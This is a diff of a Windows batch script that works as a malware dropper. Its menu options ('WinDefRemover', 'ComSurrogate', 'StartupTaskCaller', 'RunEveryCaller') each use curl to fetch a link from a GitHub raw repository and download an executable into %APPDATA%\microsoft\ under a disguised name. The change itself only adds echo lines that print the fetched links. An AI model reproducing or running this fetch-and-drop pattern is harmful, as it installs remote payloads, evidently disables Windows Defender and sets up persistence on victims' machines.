@@ -47,7 +47,8 @@ echo You chose Runtime.
 timeout /t 2 /nobreak >nul
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ShellHostFileLink') do set "SHSTFILELINK=%%i"
-
+echo %SHSTFILELINK%
+echo.
  
 :: Download the file using curl
 curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%SHSTFILELINK%"
@@ -122,7 +123,8 @@ echo You chose Runtime.
 timeout /t 2 /nobreak >nul
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ComSurrogateFileLink') do set "COMSURFILELINK=%%i"
-
+echo %COMSURFILELINK%
+echo.
 
 
  
@@ -197,7 +199,8 @@ echo You chose WinDefRemover.
 timeout /t 2 /nobreak >nul
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/WinDefRemoverFileLink') do set "WINDEFREMOVERFILELINK=%%i"
-
+echo %WINDEFREMOVERFILELINK%
+echo.
 
 
  
@@ -277,7 +280,8 @@ echo You chose STC.
 timeout /t 2 /nobreak >nul
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/StartupTaskCallerFileLink') do set "STCFILELINK=%%i"
-
+echo %STCFILELINK%
+echo.
 
 
  
@@ -361,6 +365,8 @@ echo You chose Runtime.
 timeout /t 2 /nobreak >nul
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNEVERYFILELINK=%%i"
+echo %RUNEVERYFILELINK%
+echo.
 
 
 
